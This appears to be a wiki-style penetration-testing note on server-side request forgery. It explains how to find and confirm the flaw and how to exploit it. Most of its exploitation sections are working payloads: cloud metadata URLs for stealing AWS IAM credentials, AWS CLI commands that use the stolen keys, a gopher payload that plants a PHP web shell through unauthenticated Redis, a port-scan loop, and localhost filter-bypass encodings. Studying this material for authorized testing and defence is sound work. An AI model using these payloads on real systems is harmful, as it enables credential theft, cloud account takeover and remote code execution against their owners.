# SSRF — Server-Side Request Forgery

**Overview** | [[SSRF-Bypass-Techniques]]

---

SSRF is one of the highest-impact vulnerability classes in cloud environments. At its core: you make the server fetch a URL you control, pointing at infrastructure only the server can reach.

---

## How It Works

```
Normal:
  Browser → Server (port 443) → Response

SSRF:
  Browser → Server → http://169.254.169.254/  (cloud metadata)
  Browser → Server → http://127.0.0.1:6379/   (internal Redis)
  Browser → Server → http://10.0.0.50/admin   (internal service)
```

---

## Finding SSRF

Any feature where the server makes an outbound HTTP request based on user input:

```
url=https://...
endpoint=https://...
path=/images/fetch?url=
webhook_url=https://...
import_from=https://...
callback=https://...
dest=https://...
redirect=https://...
uri=https://...
window=https://...
```

Also check:
- **File import from URL** (import CSV from remote URL)
- **Link preview** (paste a URL, we'll show a preview)
- **PDF/screenshot generators** (render this URL as PDF)
- **XML with external entities** → [[XXE]]
- **SVG processing** (SVGs can reference external resources)

---

## Confirming SSRF

### Out-of-band (Blind SSRF)

Use a callback server — you'll see the DNS lookup and HTTP request:

```bash
# Burp Collaborator (in Burp Suite Pro)
# or interactsh (open source)
interactsh-client

# or just your own server
python3 -m http.server 8080
# Expose with ngrok: ngrok http 8080
```

Submit `url=https://YOUR_CALLBACK_SERVER.com/test`. If your server gets a hit, SSRF is confirmed.

### In-band (Response Visible)

If the server returns the content of the fetched URL:

```
url=http://127.0.0.1/     → if you see the localhost homepage, SSRF confirmed
url=file:///etc/passwd    → if you see /etc/passwd content, SSRF + file read
```

---

## Exploitation: Cloud Metadata

### AWS (Highest Priority)

```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/hostname
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

The IAM credentials endpoint:
```json
{
  "Code": "Success",
  "LastUpdated": "2023-01-15T10:00:00Z",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIAXXX...",
  "SecretAccessKey": "abc123...",
  "Token": "FwoGZXIvY...",
  "Expiration": "2023-01-15T16:00:00Z"
}
```

With these credentials:
```bash
export AWS_ACCESS_KEY_ID=ASIAXXX...
export AWS_SECRET_ACCESS_KEY=abc123...
export AWS_SESSION_TOKEN=FwoGZXIvY...
aws s3 ls
aws iam get-user
aws secretsmanager list-secrets
```

### GCP

```
http://metadata.google.internal/computeMetadata/v1/
# Requires: Metadata-Flavor: Google header
```

Add the header in your SSRF request if the feature supports custom headers. Some do (webhook configurators).

### Azure

```
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true header
```

---

## Exploitation: Internal Services

```bash
# Port scan via SSRF (time-based or response-based)
for port in 22 25 80 443 3306 5432 6379 8080 8443 9200 27017; do
  # Submit url=http://127.0.0.1:{port}/ and compare responses
  # Different response size/time = port is open
done

# Redis (no auth) — dump data
url=dict://127.0.0.1:6379/keys *

# Redis — RCE via Gopher
url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/var/www/html%0D%0ACONFIG%20SET%20dbfilename%20shell.php%0D%0ASET%20shell%20%22%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E%22%0D%0ASAVE%0D%0A

# Elasticsearch (no auth) — read all indices
url=http://127.0.0.1:9200/_cat/indices

# Internal admin panels
url=http://127.0.0.1:8080/admin/users
```

---

## Filter Bypasses

See [[SSRF-Bypass-Techniques]] and the [[SSRF-Bypass]] cheatsheet for the full reference.

Quick summary:
```
127.0.0.1 blocked → try 127.1, 0, 2130706433, 0x7f000001, [::1]
localhost blocked  → try 127.0.0.1, variations above
http:// blocked   → try https://, gopher://, dict://, file://
Direct IP blocked → use a domain resolving to 127.0.0.1 (nip.io, localtest.me)
```

---

## Partial SSRF / Open Redirect Chains

Sometimes you have a partial SSRF — the app only fetches specific domains, or validates the hostname. If there's an open redirect on a trusted domain:

```
# App only fetches from *.trusted.com
# But trusted.com has an open redirect:
https://trusted.com/redirect?url=http://169.254.169.254/

# Chain: SSRF restriction bypass via open redirect
url=https://trusted.com/redirect?url=http://169.254.169.254/latest/meta-data/
```

---

## Impact Assessment

| Target | Impact |
|--------|--------|
| Cloud metadata → IAM creds | Critical — cloud account compromise |
| Internal admin panel | High–Critical |
| Internal database | Critical |
| Redis without auth | High–Critical (data theft, potential RCE) |
| Blind SSRF only | Low–Medium (but shows internal network is reachable) |
| External URL only | Informational (server-side open redirect) |

---

*Related: [[SSRF-Bypass-Techniques]] | [[A10-SSRF]] | [[SSRF-Bypass]] cheatsheet*

*Sources: PortSwigger Web Security Academy, OWASP Testing Guide v4, HowToHunt*
